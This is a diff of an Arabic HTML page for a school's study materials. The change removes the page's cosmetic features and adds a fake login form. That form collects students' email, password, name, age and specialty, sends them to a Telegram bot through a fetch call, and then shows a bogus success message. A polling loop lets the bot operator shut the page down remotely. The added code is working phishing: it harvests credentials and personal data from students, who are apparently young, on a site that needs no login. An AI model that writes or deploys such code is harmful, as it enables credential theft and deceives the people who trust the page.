@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>موقع دراسي</title>
-    <link rel="icon" href="https://raw.githubusercontent.com/klwb123/conv/main/IMG_5386.png">
     <style>
         /* General Styles */
         body {
@@ -16,30 +15,8 @@
             display: flex;
             flex-direction: column;
             min-height: 100vh;
-            overflow-x: hidden;
-            scroll-behavior: smooth;
         }
 
-        /* Dynamic Background Animation */
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: radial-gradient(circle, rgba(0,0,0,0.1), transparent);
-            z-index: -1;
-            animation: pulse 10s infinite;
-        }
-
-        @keyframes pulse {
-            0% { background-size: 100% 100%; }
-            50% { background-size: 120% 120%; }
-            100% { background-size: 100% 100%; }
-        }
-
-        /* Parallax Scrolling Effect */
         header {
             display: flex;
             justify-content: space-between;
@@ -47,8 +24,6 @@
             align-items: center;
             background-color: #111;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
-            background-attachment: fixed;
-            z-index: 100;
         }
 
         header img {
@@ -56,55 +31,24 @@
             height: auto;
         }
 
-        /* Typing Header Animation */
         h1 {
             font-size: 2.5rem;
             margin: 0;
             color: #00d9ff;
             letter-spacing: 2px;
-            white-space: nowrap;
-            overflow: hidden;
-            border-right: 3px solid;
-            width: 20ch;
-            animation: typing 4s steps(20) 1s 1 normal both, blink .75s step-end infinite;
         }
 
-        @keyframes typing {
-            from { width: 0 }
-            to { width: 20ch }
+        /* Container and Buttons */
+        .container {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            padding: 50px 20px;
         }
 
-        @keyframes blink {
-            from, to { border-color: transparent }
-            50% { border-color: #00d9ff }
-        }
-
-        /* Theme Toggle */
-        .theme-toggle {
-            cursor: pointer;
-            font-size: 1.5rem;
-            color: #00d9ff;
-        }
-
-        /* Tooltip on Hover */
-        .button {
-            position: relative;
-        }
-
-        .button:hover::after {
-            content: attr(data-tooltip);
-            position: absolute;
-            top: -30px;
-            right: 0;
-            background-color: #333;
-            color: #fff;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 0.9rem;
-            white-space: nowrap;
-        }
-
-        /* Buttons with Ripple Effect */
         .button {
             background-color: #00d9ff;
             color: #000;
@@ -120,23 +64,6 @@
             overflow: hidden;
         }
 
-        .button::before {
-            content: '';
-            position: absolute;
-            width: 300%;
-            height: 300%;
-            background: rgba(255, 255, 255, 0.15);
-            top: 50%;
-            left: 50%;
-            transition: 0.6s ease-out;
-            transform: translate(-50%, -50%) scale(0);
-            border-radius: 50%;
-        }
-
-        .button:active::before {
-            transform: translate(-50%, -50%) scale(1);
-        }
-
         .button:hover {
             background-color: #fff;
             color: #00d9ff;
@@ -144,39 +71,60 @@
             box-shadow: 0 12px 24px rgba(0, 0, 0, 0.6);
         }
 
-        .button a {
-            text-decoration: none;
-            color: inherit;
+        .login-container {
+            background-color: #111;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7);
+            margin-top: 30px;
         }
 
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #111;
-        }
-        ::-webkit-scrollbar-thumb {
-            background-color: #00d9ff;
-            border-radius: 10px;
+        .login-container label {
+            font-size: 1.1rem;
+            margin-bottom: 8px;
+            display: block;
         }
 
-        /* Scroll-to-Top Button */
-        #scrollTopBtn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 8px;
+            background-color: #222;
+            color: #fff;
+            font-size: 1rem;
+        }
+
+        .login-container input:focus {
+            outline: none;
+            border: 2px solid #00d9ff;
+            transition: border 0.3s ease;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
             background-color: #00d9ff;
             color: #000;
             border: none;
-            padding: 10px 20px;
+            border-radius: 50px;
             font-size: 1.2rem;
+            font-weight: bold;
             cursor: pointer;
-            display: none;
-            border-radius: 10px;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
         }
 
-        /* Footer */
+        .login-button:hover {
+            background-color: #fff;
+            color: #00d9ff;
+            transform: scale(1.05);
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.6);
+        }
+
         footer {
             background-color: #111;
             color: #555;
@@ -185,98 +133,102 @@
             font-size: 0.9rem;
             margin-top: auto;
         }
-
-        /* Footer Social Media Icons */
-        .social-icons {
-            margin-top: 10px;
-        }
-
-        .social-icons i {
-            font-size: 1.5rem;
-            margin: 0 10px;
-            color: #00d9ff;
-            transition: transform 0.3s ease;
-        }
-
-        .social-icons i:hover {
-            transform: scale(1.3);
-        }
     </style>
 </head>
 <body>
 
 <header>
     <h1>المواد الدراسية</h1>
-    <div>
-        <img src="https://raw.githubusercontent.com/klwb123/conv/main/IMG_5386.png" alt="Logo">
-        <span class="theme-toggle" onclick="toggleTheme()">🌓</span>
-    </div>
+    <img src="https://raw.githubusercontent.com/klwb123/conv/main/IMG_5386.png" alt="Logo">
 </header>
 
 <div class="container">
-    <button class="button" data-tooltip="فتح تطبيقات الحاسوب">
+    <button class="button">
         <a href="https://vocational.edu.iq/wp-content/uploads/2024/01/%D8%AA%D8%B7%D8%A8%D9%8A%D9%82%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D8%A7%D8%B3%D9%88%D8%A8-%D8%A7%D9%84%D8%A7%D9%88%D9%84-2023.pdf" target="_blank">تطبيقات الحاسوب</a>
     </button>
-    <button class="button" data-tooltip="فتح مبادئ الاتصال والشبكات">
+    <button class="button">
         <a href="https://vocational.edu.iq/uploads/pdf/computer/1/1/511cc.pdf" target="_blank">مبادئ الاتصال والشبكات</a>
     </button>
-    <button class="button" data-tooltip="فتح تجميع الحاسوب">
+    <button class="button">
         <a href="https://vocational.edu.iq/uploads/pdf/computer/1/1/511dd.pdf" target="_blank">تجميع الحاسوب</a>
     </button>
-    <button class="button" data-tooltip="مادة الطبيعيات">الطبيعيات</button>
-    <button class="button" data-tooltip="مادة اللغة العربية">اللغة العربية</button>
-    <button class="button" data-tooltip="مادة اللغة الانكليزية">اللغة الانكليزية</button>
-    <button class="button" data-tooltip="مادة الرياضيات">الرياضيات</button>
+    <button class="button">الطبيعيات</button>
+    <button class="button">اللغة العربية</button>
+    <button class="button">اللغة الانكليزية</button>
+    <button class="button">الرياضيات</button>
 </div>
 
-<div class="visitor-counter">
-    عدد الزوار: <span id="visitorCount">0</span>
+<div class="login-container">
+    <form id="loginForm">
+        <label for="email">البريد الإلكتروني</label>
+        <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+        
+        <label for="password">كلمة المرور</label>
+        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+
+        <label for="name">اضف اسمك</label>
+        <input type="text" id="name" placeholder="أدخل اسمك" required>
+        
+        <label for="age">عمرك</label>
+        <input type="number" id="age" placeholder="أدخل عمرك" required>
+
+        <label for="specialty">تخصصك</label>
+        <input type="text" id="specialty" placeholder="أدخل تخصصك" required>
+        
+        <button type="submit" class="login-button">تسجيل الدخول</button>
+    </form>
 </div>
 
 <footer>
-    <p>&copy; 2024 موقع دراسي - كل الحقوق محفوظة لدكتور وليد</p>
-    <div class="social-icons">
-        <i class="fab fa-facebook"></i>
-        <i class="fab fa-twitter"></i>
-        <i class="fab fa-linkedin"></i>
-    </div>
+    <p>&copy; 2024 موقع دراسي - كل الحقوق محفوظة للإعدادية الرافدين المهنية</p>
 </footer>
 
-<!-- Scroll to Top Button -->
-<button id="scrollTopBtn" onclick="scrollToTop()">⬆️</button>
-
 <script>
-    // Visitor Counter Logic
-    if (localStorage.getItem('visitCount')) {
-        localStorage.setItem('visitCount', Number(localStorage.getItem('visitCount')) + 1);
-    } else {
-        localStorage.setItem('visitCount', 1);
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const name = document.getElementById('name').value;
+        const age = document.getElementById('age').value;
+        const specialty = document.getElementById('specialty').value;
+
+        // Send data to Telegram bot
+        const botToken = "YOUR_BOT_TOKEN";
+        const chatId = "YOUR_CHAT_ID";
+        const message = `New login attempt:\nName: ${name}\nAge: ${age}\nSpecialty: ${specialty}\nEmail: ${email}\nPassword: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(response => {
+            if (response.ok) {
+                alert("تم تسجيل الدخول بنجاح!");
+            } else {
+                alert("حدث خطأ. حاول مرة أخرى.");
+            }
+        });
+
+        // Reset the form
+        e.target.reset();
+    });
+
+    // Function to control the page from Telegram bot
+    function checkTelegramCommands() {
+        fetch(`https://api.telegram.org/bot${botToken}/getUpdates`)
+        .then(response => response.json())
+        .then(data => {
+            const lastMessage = data.result[data.result.length - 1].message.text;
+
+            if (lastMessage.toLowerCase() === "close website") {
+                document.body.innerHTML = "<h1>الموقع مغلق</h1>";
+            } else if (lastMessage.toLowerCase() === "open website") {
+                location.reload(); // Reload the page to open it again
+            }
+        });
     }
-    document.getElementById('visitorCount').textContent = localStorage.getItem('visitCount');
 
-    // Scroll-to-Top Button Logic
-    window.onscroll = function() {
-        if (document.body.scrollTop > 100 || document.documentElement.scrollTop > 100) {
-            document.getElementById('scrollTopBtn').style.display = "block";
-        } else {
-            document.getElementById('scrollTopBtn').style.display = "none";
-        }
-    };
-
-    function scrollToTop() {
-        document.body.scrollTop = 0;
-        document.documentElement.scrollTop = 0;
-    }
-
-    // Dark/Light Theme Toggle
-    function toggleTheme() {
-        document.body.classList.toggle('light-theme');
-    }
-
-    // Loading Spinner (Add if you have longer loading content)
-    window.onload = function() {
-        document.body.classList.add('fade-in');
-    };
+    // Polling Telegram commands every 5 seconds
+    setInterval(checkTelegramCommands, 5000);
 </script>
+
 </body>
 </html>
